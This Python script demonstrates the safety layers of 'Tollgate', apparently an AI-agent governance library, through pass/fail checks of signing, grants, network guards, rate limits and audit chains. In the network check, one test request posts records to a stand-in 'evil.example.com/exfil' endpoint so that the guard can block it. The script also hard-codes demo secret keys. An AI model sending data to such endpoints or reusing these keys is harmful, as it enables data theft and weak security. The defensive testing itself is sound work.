#!/usr/bin/env python3
"""Comprehensive safety showcase for leadership demos.

This script demonstrates the real power of Tollgate across the full
safety stack with concrete pass/fail examples.

Run:
    python examples/leadership_showcase/full_safety_showcase.py
"""

from __future__ import annotations

import asyncio
import json
import sys
import time
from dataclasses import dataclass, replace
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[2]
sys.path.append(str(ROOT / "src"))

from tollgate import (  # noqa: E402
    AgentContext,
    AnomalyDetector,
    AutoApprover,
    CompositeAuditSink,
    ContextIntegrityMonitor,
    ControlTower,
    DecisionType,
    Effect,
    Grant,
    InMemoryCircuitBreaker,
    InMemoryGrantStore,
    InMemoryRateLimiter,
    Intent,
    JsonlAuditSink,
    NetworkGuard,
    PolicyTestRunner,
    TollgateApprovalDenied,
    TollgateConstraintViolation,
    TollgateDenied,
    TollgateRateLimited,
    ToolRegistry,
    ToolRequest,
    YamlPolicyEvaluator,
    make_verifier,
    sign_agent_context,
)
from tollgate.backends import SQLiteGrantStore  # noqa: E402
from tollgate.manifest_signing import (  # noqa: E402
    get_manifest_hash,
    sign_manifest,
    verify_manifest,
)

# Optional security features (requires tollgate[encryption])
try:  # noqa: SIM105
    from tollgate.security import (  # type: ignore[attr-defined]
        EncryptedAuditSink,
        FieldEncryptor,
        ImmutableAuditSink,
    )
    from tollgate.security.encryption import EncryptedValueDecoder  # type: ignore[attr-defined]

    HAS_ENCRYPTION = True
except Exception:
    HAS_ENCRYPTION = False
    EncryptedAuditSink = None
    EncryptedValueDecoder = None
    FieldEncryptor = None
    ImmutableAuditSink = None


EXAMPLE_DIR = Path(__file__).parent
MANIFEST_PATH = EXAMPLE_DIR / "full_manifest.yaml"
POLICY_PATH = EXAMPLE_DIR / "full_policy.yaml"
SCENARIOS_PATH = EXAMPLE_DIR / "full_scenarios.yaml"
AUDIT_PATH = EXAMPLE_DIR / "full_showcase_audit.jsonl"
CHAIN_AUDIT_PATH = EXAMPLE_DIR / "full_immutable_audit.jsonl"
SQLITE_DB_PATH = EXAMPLE_DIR / "full_showcase.sqlite"
RUNTIME_MANIFEST_PATH = EXAMPLE_DIR / "runtime_manifest.yaml"

MANIFEST_SIGNING_KEY = b"demo-manifest-key-123456"
AGENT_SIGNING_KEY = b"demo-agent-key-12345678"
IMMUTABLE_AUDIT_KEY = b"demo-immutable-audit-key-1234567890"
ENCRYPTION_KEY = b"0123456789abcdef0123456789abcdef"


@dataclass
class CheckResult:
    name: str
    status: str  # PASS, FAIL, SKIP
    detail: str


def banner(title: str) -> None:
    print("\n" + "=" * 88)
    print(title)
    print("=" * 88)


def record(
    results: list[CheckResult],
    name: str,
    passed: bool,
    detail: str,
) -> None:
    status = "PASS" if passed else "FAIL"
    results.append(CheckResult(name=name, status=status, detail=detail))
    print(f"[{status}] {name}: {detail}")


def record_skip(results: list[CheckResult], name: str, detail: str) -> None:
    results.append(CheckResult(name=name, status="SKIP", detail=detail))
    print(f"[SKIP] {name}: {detail}")


def build_request(
    registry: ToolRegistry,
    tool_key: str,
    action: str,
    params: dict[str, Any],
) -> ToolRequest:
    effect, resource_type, manifest_version = registry.resolve_tool(tool_key)
    return ToolRequest(
        tool=tool_key,
        action=action,
        resource_type=resource_type,
        effect=effect,
        params=params,
        manifest_version=manifest_version,
    )


async def dummy_exec(result: Any) -> Any:
    return result


async def check_manifest_signing(results: list[CheckResult]) -> None:
    name = "Manifest Signing (Supply Chain Integrity)"
    try:
        RUNTIME_MANIFEST_PATH.write_text(MANIFEST_PATH.read_text(encoding="utf-8"), encoding="utf-8")
        sign_manifest(RUNTIME_MANIFEST_PATH, secret_key=MANIFEST_SIGNING_KEY)

        before_hash = get_manifest_hash(RUNTIME_MANIFEST_PATH)
        verified_before = verify_manifest(
            RUNTIME_MANIFEST_PATH,
            secret_key=MANIFEST_SIGNING_KEY,
        )

        RUNTIME_MANIFEST_PATH.write_text(
            RUNTIME_MANIFEST_PATH.read_text(encoding="utf-8") + "\n# tampered\n",
            encoding="utf-8",
        )
        after_hash = get_manifest_hash(RUNTIME_MANIFEST_PATH)
        verified_after = verify_manifest(
            RUNTIME_MANIFEST_PATH,
            secret_key=MANIFEST_SIGNING_KEY,
        )

        # ToolRegistry should reject tampered manifest when signing key is provided.
        registry_rejected = False
        try:
            ToolRegistry(RUNTIME_MANIFEST_PATH, signing_key=MANIFEST_SIGNING_KEY)
        except ValueError:
            registry_rejected = True

        passed = (
            verified_before
            and before_hash != after_hash
            and not verified_after
            and registry_rejected
        )
        detail = (
            "Signed manifest verified, tampering detected, and registry load rejected."
            if passed
            else "Manifest signing check did not behave as expected."
        )
        record(results, name, passed, detail)
    except Exception as exc:
        record(results, name, False, f"Unexpected error: {exc}")


async def check_agent_identity_signing(results: list[CheckResult]) -> None:
    name = "Agent Identity Signing (Spoofing Protection)"
    try:
        registry = ToolRegistry(MANIFEST_PATH)
        tower = ControlTower(
            policy=YamlPolicyEvaluator(POLICY_PATH),
            approver=AutoApprover(),
            audit=JsonlAuditSink(AUDIT_PATH),
            registry=registry,
            verify_fn=make_verifier(AGENT_SIGNING_KEY),
            enable_telemetry=False,
        )

        signed_agent = sign_agent_context(
            AgentContext(agent_id="ops-agent", version="1.0.0", owner="lab"),
            AGENT_SIGNING_KEY,
        )
        intent = Intent(action="read_customer", reason="identity test")
        req = build_request(
            registry,
            "api:get_customer_summary",
            "get",
            {"customer_id": "cust-101"},
        )

        await tower.execute_async(
            signed_agent,
            intent,
            req,
            lambda: dummy_exec({"ok": True}),
        )

        spoofed = replace(signed_agent, agent_id="spoofed-agent")
        spoof_blocked = False
        try:
            await tower.execute_async(
                spoofed,
                intent,
                req,
                lambda: dummy_exec({"ok": True}),
            )
        except TollgateDenied:
            spoof_blocked = True

        record(
            results,
            name,
            spoof_blocked,
            "Valid signed agent allowed; tampered identity denied.",
        )
    except Exception as exc:
        record(results, name, False, f"Unexpected error: {exc}")


async def check_policy_approval_and_grants(results: list[CheckResult]) -> None:
    name = "Policy + Approval + Grants (Controlled Autonomy)"
    try:
        registry = ToolRegistry(MANIFEST_PATH)
        grants = InMemoryGrantStore()
        tower = ControlTower(
            policy=YamlPolicyEvaluator(POLICY_PATH),
            approver=AutoApprover(),
            audit=JsonlAuditSink(AUDIT_PATH),
            registry=registry,
            grant_store=grants,
            enable_telemetry=False,
        )

        agent = AgentContext(agent_id="ops-agent", version="1.0.0", owner="lab")
        intent = Intent(action="write_note", reason="update customer note")
        req = build_request(
            registry,
            "api:update_customer_note",
            "post",
            {"customer_id": "cust-101", "note": "Escalated to manual review"},
        )

        denied_without_grant = False
        try:
            await tower.execute_async(
                agent,
                intent,
                req,
                lambda: dummy_exec({"status": "written"}),
            )
        except TollgateApprovalDenied:
            denied_without_grant = True

        grant = Grant(
            agent_id=agent.agent_id,
            effect=Effect.WRITE,
            tool="api:update_customer_note",
            action="post",
            resource_type="customer",
            expires_at=time.time() + 300,
            granted_by="director",
            created_at=time.time(),
            reason="Time-boxed approval for incident response",
        )
        await grants.create_grant(grant)

        result = await tower.execute_async(
            agent,
            intent,
            req,
            lambda: dummy_exec({"status": "written"}),
        )
        usage = await grants.get_usage_count(grant.id)

        passed = denied_without_grant and result["status"] == "written" and usage == 1
        record(
            results,
            name,
            passed,
            "Write denied without grant, then allowed with scoped time-bound grant.",
        )
    except Exception as exc:
        record(results, name, False, f"Unexpected error: {exc}")


async def check_unknown_tool_safe_default(results: list[CheckResult]) -> None:
    name = "Safe Default DENY (Unknown Tools/Effects)"
    try:
        registry = ToolRegistry(MANIFEST_PATH)
        tower = ControlTower(
            policy=YamlPolicyEvaluator(POLICY_PATH),
            approver=AutoApprover(),
            audit=JsonlAuditSink(AUDIT_PATH),
            registry=registry,
            enable_telemetry=False,
        )

        unknown_req = build_request(
            registry,
            "api:nonexistent_tool",
            "run",
            {"x": 1},
        )
        blocked = False
        try:
            await tower.execute_async(
                AgentContext(agent_id="ops-agent", version="1.0", owner="lab"),
                Intent(action="unknown_action", reason="test safe default"),
                unknown_req,
                lambda: dummy_exec({"unexpected": "execution"}),
            )
        except TollgateDenied:
            blocked = True

        record(results, name, blocked, "Unknown tool resolved to UNKNOWN effect and was denied.")
    except Exception as exc:
        record(results, name, False, f"Unexpected error: {exc}")


async def check_parameter_schema_validation(results: list[CheckResult]) -> None:
    name = "Parameter Schema Validation"
    try:
        registry = ToolRegistry(MANIFEST_PATH)
        tower = ControlTower(
            policy=YamlPolicyEvaluator(POLICY_PATH),
            approver=AutoApprover(),
            audit=JsonlAuditSink(AUDIT_PATH),
            registry=registry,
            enable_telemetry=False,
        )

        agent = AgentContext(agent_id="ops-agent", version="1.0.0", owner="lab")
        intent = Intent(action="read_customer", reason="schema validation")

        invalid_req = build_request(
            registry,
            "api:get_customer_summary",
            "get",
            {"customer_id": "customer-xyz"},
        )
        valid_req = build_request(
            registry,
            "api:get_customer_summary",
            "get",
            {"customer_id": "cust-101"},
        )

        invalid_blocked = False
        try:
            await tower.execute_async(
                agent,
                intent,
                invalid_req,
                lambda: dummy_exec({"balance": 100}),
            )
        except TollgateDenied:
            invalid_blocked = True

        valid_result = await tower.execute_async(
            agent,
            intent,
            valid_req,
            lambda: dummy_exec({"balance": 100}),
        )

        passed = invalid_blocked and valid_result["balance"] == 100
        record(results, name, passed, "Invalid params blocked, valid params allowed.")
    except Exception as exc:
        record(results, name, False, f"Unexpected error: {exc}")


async def check_network_and_tool_constraints(results: list[CheckResult]) -> None:
    name = "NetworkGuard + Per-Tool URL Constraints"
    try:
        registry = ToolRegistry(MANIFEST_PATH)
        guard = NetworkGuard(
            default="deny",
            allowlist=[
                {"pattern": "https://api.company.com/*"},
                {"pattern": "https://hooks.company.com/*"},
            ],
            blocklist=[{"pattern": "http://*"}],
            param_fields_to_check=["url"],
        )

        tower = ControlTower(
            policy=YamlPolicyEvaluator(POLICY_PATH),
            approver=AutoApprover(),
            audit=JsonlAuditSink(AUDIT_PATH),
            registry=registry,
            network_guard=guard,
            enable_telemetry=False,
        )

        agent = AgentContext(agent_id="ops-agent", version="1.0.0", owner="lab")
        intent = Intent(action="network_ops", reason="network policy test")

        evil_webhook = build_request(
            registry,
            "api:post_webhook",
            "post",
            {"url": "https://evil.example.com/exfil", "payload": {"records": 50}},
        )
        private_url_req = build_request(
            registry,
            "api:fetch_partner_data",
            "get",
            {"url": "https://api.company.com/private/export"},
        )
        allowed_url_req = build_request(
            registry,
            "api:fetch_partner_data",
            "get",
            {"url": "https://api.company.com/public/status"},
        )

        blocked_by_network = False
        blocked_by_tool_constraint = False

        try:
            await tower.execute_async(
                agent,
                intent,
                evil_webhook,
                lambda: dummy_exec({"status": "delivered"}),
            )
        except TollgateConstraintViolation:
            blocked_by_network = True

        try:
            await tower.execute_async(
                agent,
                intent,
                private_url_req,
                lambda: dummy_exec({"data": "private"}),
            )
        except TollgateConstraintViolation:
            blocked_by_tool_constraint = True

        allowed = await tower.execute_async(
            agent,
            intent,
            allowed_url_req,
            lambda: dummy_exec({"data": "ok"}),
        )

        passed = (
            blocked_by_network
            and blocked_by_tool_constraint
            and allowed["data"] == "ok"
        )
        record(
            results,
            name,
            passed,
            "Global network policy blocked exfil; per-tool constraint blocked private endpoint.",
        )
    except Exception as exc:
        record(results, name, False, f"Unexpected error: {exc}")


async def check_rate_limiting(results: list[CheckResult]) -> None:
    name = "Rate Limiting"
    try:
        registry = ToolRegistry(MANIFEST_PATH)
        limiter = InMemoryRateLimiter([
            {
                "agent_id": "*",
                "tool": "api:get_customer_summary",
                "max_calls": 2,
                "window_seconds": 60,
            }
        ])

        tower = ControlTower(
            policy=YamlPolicyEvaluator(POLICY_PATH),
            approver=AutoApprover(),
            audit=JsonlAuditSink(AUDIT_PATH),
            registry=registry,
            rate_limiter=limiter,
            enable_telemetry=False,
        )

        agent = AgentContext(agent_id="ops-agent", version="1.0.0", owner="lab")
        intent = Intent(action="read_customer", reason="rate test")
        req = build_request(
            registry,
            "api:get_customer_summary",
            "get",
            {"customer_id": "cust-101"},
        )

        await tower.execute_async(agent, intent, req, lambda: dummy_exec({"n": 1}))
        await tower.execute_async(agent, intent, req, lambda: dummy_exec({"n": 2}))

        rate_limited = False
        try:
            await tower.execute_async(agent, intent, req, lambda: dummy_exec({"n": 3}))
        except TollgateRateLimited:
            rate_limited = True

        record(results, name, rate_limited, "Third call within window was rate-limited.")
    except Exception as exc:
        record(results, name, False, f"Unexpected error: {exc}")


async def check_circuit_breaker(results: list[CheckResult]) -> None:
    name = "Circuit Breaker"
    try:
        registry = ToolRegistry(MANIFEST_PATH)
        breaker = InMemoryCircuitBreaker(failure_threshold=2, cooldown_seconds=0.35)
        tower = ControlTower(
            policy=YamlPolicyEvaluator(POLICY_PATH),
            approver=AutoApprover(),
            audit=JsonlAuditSink(AUDIT_PATH),
            registry=registry,
            circuit_breaker=breaker,
            enable_telemetry=False,
        )

        agent = AgentContext(agent_id="ops-agent", version="1.0.0", owner="lab")
        intent = Intent(action="read_customer", reason="breaker test")
        req = build_request(
            registry,
            "api:get_customer_summary",
            "get",
            {"customer_id": "cust-101"},
        )

        async def failing_exec() -> Any:
            raise RuntimeError("vendor timeout")

        for _ in range(2):
            try:
                await tower.execute_async(agent, intent, req, failing_exec)
            except RuntimeError:
                pass

        blocked_while_open = False
        try:
            await tower.execute_async(
                agent,
                intent,
                req,
                lambda: dummy_exec({"status": "recovered"}),
            )
        except TollgateDenied:
            blocked_while_open = True

        await asyncio.sleep(0.4)

        recovered = await tower.execute_async(
            agent,
            intent,
            req,
            lambda: dummy_exec({"status": "recovered"}),
        )

        passed = blocked_while_open and recovered["status"] == "recovered"
        record(
            results,
            name,
            passed,
            "Repeated failures opened the circuit; probe after cooldown recovered.",
        )
    except Exception as exc:
        record(results, name, False, f"Unexpected error: {exc}")


async def check_delegation_controls(results: list[CheckResult]) -> None:
    name = "Multi-Agent Delegation Controls"
    try:
        registry = ToolRegistry(MANIFEST_PATH)
        tower = ControlTower(
            policy=YamlPolicyEvaluator(POLICY_PATH),
            approver=AutoApprover(),
            audit=JsonlAuditSink(AUDIT_PATH),
            registry=registry,
            enable_telemetry=False,
        )

        write_req = build_request(
            registry,
            "api:update_customer_note",
            "post",
            {"customer_id": "cust-101", "note": "Delegation test"},
        )
        intent = Intent(action="write_note", reason="delegation test")

        untrusted_agent = AgentContext(
            agent_id="worker-1",
            version="1.0",
            owner="lab",
            delegated_by=("external-router",),
        )
        trusted_agent = AgentContext(
            agent_id="worker-2",
            version="1.0",
            owner="lab",
            delegated_by=("orchestrator",),
        )
        deep_agent = AgentContext(
            agent_id="worker-3",
            version="1.0",
            owner="lab",
            delegated_by=("orchestrator", "router", "edge"),
        )

        untrusted_blocked = False
        deep_blocked = False
        trusted_allowed = False

        try:
            await tower.execute_async(
                untrusted_agent,
                intent,
                write_req,
                lambda: dummy_exec({"status": "written"}),
            )
        except TollgateApprovalDenied:
            untrusted_blocked = True

        trusted_result = await tower.execute_async(
            trusted_agent,
            intent,
            write_req,
            lambda: dummy_exec({"status": "written"}),
        )
        trusted_allowed = trusted_result["status"] == "written"

        try:
            await tower.execute_async(
                deep_agent,
                intent,
                write_req,
                lambda: dummy_exec({"status": "written"}),
            )
        except TollgateApprovalDenied:
            deep_blocked = True

        passed = untrusted_blocked and trusted_allowed and deep_blocked
        record(
            results,
            name,
            passed,
            "Untrusted/deep delegated writes required approval; trusted delegation was allowed.",
        )
    except Exception as exc:
        record(results, name, False, f"Unexpected error: {exc}")


async def check_context_integrity(results: list[CheckResult]) -> None:
    name = "Context Integrity Monitoring"
    try:
        monitor = ContextIntegrityMonitor(
            immutable_fields={"system_prompt", "security_level"},
        )

        context = {
            "system_prompt": "Always follow security policy.",
            "security_level": "standard",
            "session_state": {"step": 1},
        }
        monitor.snapshot("ops-agent", "turn-1", context)

        unchanged = monitor.verify("ops-agent", "turn-1", context)

        tampered = dict(context)
        tampered["security_level"] = "admin"
        tampered_result = monitor.verify("ops-agent", "turn-1", tampered)

        passed = unchanged.is_valid and (not tampered_result.is_valid)
        detail = (
            "Immutable context change detected"
            if passed
            else "Context tampering was not detected as expected"
        )
        record(results, name, passed, detail)
    except Exception as exc:
        record(results, name, False, f"Unexpected error: {exc}")


async def check_anomaly_detection(results: list[CheckResult]) -> None:
    name = "Anomaly Detection on Audit Stream"
    try:
        registry = ToolRegistry(MANIFEST_PATH)
        detector = AnomalyDetector(min_samples=2, z_score_threshold=2.0)
        audit = CompositeAuditSink([JsonlAuditSink(AUDIT_PATH), detector])

        tower = ControlTower(
            policy=YamlPolicyEvaluator(POLICY_PATH),
            approver=AutoApprover(),
            audit=audit,
            registry=registry,
            enable_telemetry=False,
        )

        agent = AgentContext(agent_id="ops-agent", version="1.0", owner="lab")
        intent = Intent(action="anomaly_demo", reason="detector test")

        req1 = build_request(
            registry,
            "api:get_customer_summary",
            "get",
            {"customer_id": "cust-101"},
        )
        req2 = build_request(
            registry,
            "api:fetch_partner_data",
            "get",
            {"url": "https://api.company.com/public/status"},
        )

        await tower.execute_async(agent, intent, req1, lambda: dummy_exec({"ok": 1}))
        await tower.execute_async(agent, intent, req2, lambda: dummy_exec({"ok": 2}))

        alerts = detector.get_alerts()
        unusual_tool_alert = any(a.alert_type == "unusual_tool" for a in alerts)

        record(
            results,
            name,
            unusual_tool_alert,
            "Detector flagged new tool usage pattern for the same agent.",
        )
    except Exception as exc:
        record(results, name, False, f"Unexpected error: {exc}")


async def check_immutable_audit_chain(results: list[CheckResult]) -> None:
    name = "Immutable Audit Chain"
    if not HAS_ENCRYPTION or ImmutableAuditSink is None:
        record_skip(
            results,
            name,
            "cryptography package not available; immutable audit demo skipped.",
        )
        return

    try:
        CHAIN_AUDIT_PATH.write_text("", encoding="utf-8")

        registry = ToolRegistry(MANIFEST_PATH)
        json_sink = JsonlAuditSink(CHAIN_AUDIT_PATH)
        immutable = ImmutableAuditSink(json_sink, IMMUTABLE_AUDIT_KEY)

        tower = ControlTower(
            policy=YamlPolicyEvaluator(POLICY_PATH),
            approver=AutoApprover(),
            audit=immutable,
            registry=registry,
            enable_telemetry=False,
        )

        agent = AgentContext(agent_id="ops-agent", version="1.0", owner="lab")
        intent = Intent(action="immutable_audit", reason="integrity test")

        req = build_request(
            registry,
            "api:get_customer_summary",
            "get",
            {"customer_id": "cust-101"},
        )

        await tower.execute_async(agent, intent, req, lambda: dummy_exec({"ok": 1}))
        await tower.execute_async(agent, intent, req, lambda: dummy_exec({"ok": 2}))

        events = [
            json.loads(line)
            for line in CHAIN_AUDIT_PATH.read_text(encoding="utf-8").splitlines()
            if line.strip()
        ]
        valid, _ = ImmutableAuditSink.verify_chain(events, IMMUTABLE_AUDIT_KEY)

        tampered = json.loads(json.dumps(events))
        tampered[0]["decision"]["reason"] = "tampered"
        tampered_valid, _ = ImmutableAuditSink.verify_chain(
            tampered,
            IMMUTABLE_AUDIT_KEY,
        )

        passed = valid and (not tampered_valid)
        record(
            results,
            name,
            passed,
            "Valid chain verified and tampering was detected.",
        )
    except Exception as exc:
        record(results, name, False, f"Unexpected error: {exc}")


async def check_encrypted_audit(results: list[CheckResult]) -> None:
    name = "Field-Level Encrypted Audit"
    if (
        not HAS_ENCRYPTION
        or EncryptedAuditSink is None
        or FieldEncryptor is None
        or EncryptedValueDecoder is None
    ):
        record_skip(
            results,
            name,
            "cryptography package not available; encrypted audit demo skipped.",
        )
        return

    try:
        class MemorySink:
            def __init__(self):
                self.events: list[dict[str, Any]] = []

            def emit(self, event: Any) -> None:
                self.events.append(event.to_dict())

        sink = MemorySink()
        encryptor = FieldEncryptor(ENCRYPTION_KEY, key_id="demo-key")
        encrypted_sink = EncryptedAuditSink(sink, encryptor)

        registry = ToolRegistry(MANIFEST_PATH)
        tower = ControlTower(
            policy=YamlPolicyEvaluator(POLICY_PATH),
            approver=AutoApprover(),
            audit=encrypted_sink,
            registry=registry,
            enable_telemetry=False,
        )

        agent = AgentContext(agent_id="ops-agent", version="1.0", owner="lab")
        intent = Intent(action="encrypted_audit", reason="privacy test")
        req = build_request(
            registry,
            "api:get_customer_summary",
            "get",
            {"customer_id": "cust-101"},
        )

        await tower.execute_async(agent, intent, req, lambda: dummy_exec({"ok": True}))

        if not sink.events:
            record(results, name, False, "No audit events captured.")
            return

        event = sink.events[-1]
        params = event.get("tool_request", {}).get("params", {})
        encrypted = isinstance(params, dict) and params.get("_encrypted") is True

        decoder = EncryptedValueDecoder({encryptor.key_id: encryptor})
        decrypted = decoder.decrypt_event(event)
        recovered = (
            decrypted.get("tool_request", {})
            .get("params", {})
            .get("customer_id")
            == "cust-101"
        )

        passed = encrypted and recovered
        record(
            results,
            name,
            passed,
            "Sensitive audit fields encrypted at rest and recoverable with key.",
        )
    except Exception as exc:
        record(results, name, False, f"Unexpected error: {exc}")


async def check_policy_regression_tests(results: list[CheckResult]) -> None:
    name = "Policy Regression Testing"
    try:
        runner = PolicyTestRunner(POLICY_PATH, SCENARIOS_PATH)
        run_result = runner.run()
        passed = run_result.all_passed and run_result.total >= 5
        detail = f"{run_result.passed}/{run_result.total} scenarios passed"
        record(results, name, passed, detail)
    except Exception as exc:
        record(results, name, False, f"Unexpected error: {exc}")


async def check_persistent_grants(results: list[CheckResult]) -> None:
    name = "Persistent Grant Backend (SQLite)"
    try:
        if SQLITE_DB_PATH.exists():
            SQLITE_DB_PATH.unlink()

        store_a = SQLiteGrantStore(SQLITE_DB_PATH)
        grant = Grant(
            agent_id="ops-agent",
            effect=Effect.WRITE,
            tool="api:update_customer_note",
            action="post",
            resource_type="customer",
            expires_at=time.time() + 600,
            granted_by="director",
            created_at=time.time(),
            reason="Persistence check",
        )
        await store_a.create_grant(grant)
        store_a.close()

        store_b = SQLiteGrantStore(SQLITE_DB_PATH)
        grants = await store_b.list_active_grants(agent_id="ops-agent")
        store_b.close()

        persisted = any(g.id == grant.id for g in grants)
        record(
            results,
            name,
            persisted,
            "Grant persisted across store restarts.",
        )
    except Exception as exc:
        record(results, name, False, f"Unexpected error: {exc}")


async def run_showcase() -> None:
    banner("TOLLGATE FULL SAFETY SHOWCASE")
    print("This run demonstrates each major safety layer with concrete outcomes.")

    AUDIT_PATH.write_text("", encoding="utf-8")

    results: list[CheckResult] = []

    await check_manifest_signing(results)
    await check_agent_identity_signing(results)
    await check_policy_approval_and_grants(results)
    await check_unknown_tool_safe_default(results)
    await check_parameter_schema_validation(results)
    await check_network_and_tool_constraints(results)
    await check_rate_limiting(results)
    await check_circuit_breaker(results)
    await check_delegation_controls(results)
    await check_context_integrity(results)
    await check_anomaly_detection(results)
    await check_immutable_audit_chain(results)
    await check_encrypted_audit(results)
    await check_policy_regression_tests(results)
    await check_persistent_grants(results)

    banner("SHOWCASE SCORECARD")
    counts = {"PASS": 0, "FAIL": 0, "SKIP": 0}
    for result in results:
        counts[result.status] += 1
        print(f"- {result.status}: {result.name}")

    print("\nSummary:")
    print(f"- Passed: {counts['PASS']}")
    print(f"- Failed: {counts['FAIL']}")
    print(f"- Skipped: {counts['SKIP']}")
    print(f"- Audit log: {AUDIT_PATH}")

    banner("LEADERSHIP TALK TRACK")
    print("1. We enforced who can act, what they can do, and where they can connect.")
    print("2. We blocked unsafe actions before execution, not after incident review.")
    print("3. We generated cryptographically verifiable evidence for governance.")
    print("4. We validated policy behavior in test scenarios before production rollout.")


if __name__ == "__main__":
    asyncio.run(run_showcase())
